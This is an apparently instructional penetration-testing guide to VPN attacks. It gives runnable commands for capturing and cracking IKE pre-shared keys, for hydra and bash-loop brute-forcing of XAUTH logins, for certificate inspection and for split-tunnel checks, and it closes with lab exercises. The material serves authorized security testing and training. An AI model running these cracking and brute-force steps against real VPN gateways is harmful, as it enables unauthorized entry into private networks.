# VPN Credential and Tunnel Attack Guide

## Introduction

VPN credentials and tunnels are critical attack surfaces in enterprise networks. Once a VPN gateway has been identified and enumerated, the next phase involves testing credential strength, analyzing tunnel security, and assessing the overall robustness of the VPN implementation. This guide covers PSK cracking, certificate analysis, tunnel hijacking concepts, and credential brute force techniques for authorized penetration testing.

VPN credentials are particularly valuable to attackers because they often provide direct access to internal networks, bypassing perimeter defenses. A compromised VPN account can be used for persistent access, lateral movement, and data exfiltration. Organizations that rely solely on username/password authentication for VPN access are especially vulnerable to credential-based attacks.

**Objectives**: Crack captured PSK hashes, analyze VPN certificates, test tunnel security, and assess split tunneling risks.

## PSK Cracking

### Capturing PSK Hash

Aggressive Mode IKE negotiations transmit the PSK hash in cleartext, making it vulnerable to capture and offline cracking. The quality of the PSK directly determines how resistant it will be to dictionary attacks.

```bash
# Capture PSK via aggressive mode with specific transform
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1 > psk_hash.txt

# Extract the hash value from capture
grep -i "hash\|SA\|key" psk_hash.txt

# Try multiple transforms if the first fails
ike-scan --aggressive --trans='5,1,2,2' --trans='5,2,2,2' --trans='5,1,65001,2' -M 192.168.1.1 > psk_all.txt
```

### ikeforce Dictionary Attack

ikeforce performs online dictionary attacks against IKE VPN gateways using aggressive mode. This is useful when you cannot capture a hash but know the transform set and identity.

```bash
# Basic dictionary attack with common wordlist
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -w /usr/share/wordlists/rockyou.txt

# With custom ID type (FQDN, IP, or user FQDN)
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -u ID_FQDN -w wordlist.txt

# Numeric PIN brute force for group IDs
for i in $(seq 0000 9999); do
  ike-scan --aggressive --trans='5,1,2,2' --id="$i" 192.168.1.1 2>/dev/null
done
```

### ikecrack Offline Cracking

ikecrack performs offline cracking of captured PSK hashes, which is faster and stealthier than online attacks since it does not generate traffic to the target.

```bash
# Crack captured PSK hash offline with dictionary
python3 ikecrack.py -h captured_hash.txt -d dictionary.txt

# With custom charset for targeted brute force
python3 ikecrack.py -h captured_hash.txt -c charset.txt
```

## Certificate Analysis

### Certificate Retrieval and Inspection

VPN certificates often contain valuable intelligence about the organization, including internal hostnames, department names, and email addresses. Certificate weaknesses such as self-signed certs or expired certificates can indicate security maturity gaps.

```bash
# Retrieve VPN certificate and inspect all fields
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -text

# Check certificate validity (current time)
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -checkend 0 -noout

# Extract and save certificate for offline analysis
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -out vpn_cert.pem

# Verify certificate chain against system CA store
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt vpn_cert.pem
```

### Self-Signed Certificate Testing

```bash
# Generate test certificate for authentication testing
openssl req -x509 -newkey rsa:2048 -nodes -keyout test.key -out test.crt -days 365 -subj "/CN=vpn-test"

# Create PKCS12 bundle for VPN client import
openssl pkcs12 -export -out test.p12 -inkey test.key -in test.crt -name "VPN Test"

# Check for certificate pinning by testing if server accepts any valid cert
# If the server accepts any CA-signed certificate, pinning is not enforced
```

## Tunnel Security Testing

### Traffic Capture and Analysis

Analyzing VPN tunnel traffic can reveal configuration weaknesses such as unencrypted payloads, weak cipher negotiations, or information leakage through IKE metadata.

```bash
# Capture IKE and ESP traffic for analysis
tcpdump -i any -w vpn_full.pcap 'udp port 500 or udp port 4500 or proto 50'

# Analyze IKE negotiation details
tshark -r vpn_full.pcap -Y "isakmp" -T fields -e ip.src -e ip.dst -e isakmp.type -e isakmp.dh_group

# Check for plaintext leaking into ESP (indicates encryption bypass)
tshark -r vpn_full.pcap -Y "esp" -x | head -50
```

### Split Tunneling Detection

Split tunneling allows VPN traffic to route only specific networks through the tunnel while other traffic goes directly to the Internet. This configuration can leak sensitive DNS queries and expose the client's real IP address.

```bash
# Check routing table for VPN-specific entries
ip route show

# Identify VPN-specific routes
ip route show table all | grep -i "tun\|ppp"

# Test for Internet bypass (if traceroute goes through physical interface, split tunnel is active)
traceroute -n 8.8.8.8 2>&1 | head -5

# DNS leak test comparing VPN vs real IP
dig +short myip.opendns.com @resolver1.opendns.com
ip addr show tun0 | grep inet
```

### Tunnel Hijacking Concepts

MITM on VPN connections requires positioning between client and VPN gateway, which typically involves ARP spoofing on the local network segment.

```bash
# Detect ARP spoofing attempts (defensive monitoring)
arpwatch -i eth0

# Monitor for rogue VPN gateways on the network
ike-scan -M 192.168.1.0/24 | grep -i "VID\|encryption"
```

## XAUTH Credential Testing

### vpnc Connection Testing

```bash
# Test XAUTH credentials with vpnc
vpnc --gateway 192.168.1.1 --id groupname --secret grouppsk --username testuser

# Debug mode for detailed negotiation output
vpnc --debug 3 --gateway 192.168.1.1 --id groupname --secret grouppsk --username testuser 2>&1 | tee vpnc_debug.log

# Disconnect active session
vpnc-disconnect
```

### Automated Credential Testing

```bash
# Hydra against IKE XAUTH service
hydra -l admin -P passwords.txt 192.168.1.1 ike

# Custom bash brute force with timeout protection
while IFS= read -r user; do
  while IFS= read -r pass; do
    timeout 5 vpnc --gateway 192.168.1.1 --id test --secret psk --username "$user" --password "$pass" 2>/dev/null && echo "SUCCESS: $user:$pass"
    vpnc-disconnect 2>/dev/null
  done < passwords.txt
done < usernames.txt
```

## Hands-on Exercises

### Exercise 1: PSK Hash Capture and Crack

Capture an aggressive mode PSK hash and attempt dictionary cracking.

```bash
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1 > hash.txt
# Analyze the captured hash and attempt offline crack
```

### Exercise 2: Certificate Chain Analysis

Retrieve and analyze the full certificate chain of a VPN gateway, documenting any weaknesses found.

```bash
openssl s_client -showcerts -connect 192.168.1.1:443 </dev/null 2>/dev/null | openssl x509 -noout -text
```

### Exercise 3: Split Tunneling Verification

Connect to a test VPN and verify if traffic leaks outside the tunnel by capturing on the physical interface.

```bash
tcpdump -i eth0 -c 100 'not arp and not port 500 and not port 4500 and not proto 50'
# Generate traffic and check for leaks
```

### Exercise 4: vpnc Connection Profile Analysis

Analyze a provided .pcf VPN profile for security issues such as weak encryption or embedded credentials.

```bash
cat profile.pcf
grep -i "enc\|hash\|group" profile.pcf
```

## References

- ikeforce — https://github.com/SpiderLabs/ikeforce
- ikecrack — https://github.com/royhills/ikecrack
- vpnc documentation — https://github.com/streambinder/vpnc
- RFC 2409 — The Internet Key Exchange (IKE)
- VPN security testing — PTES Technical Guidelines
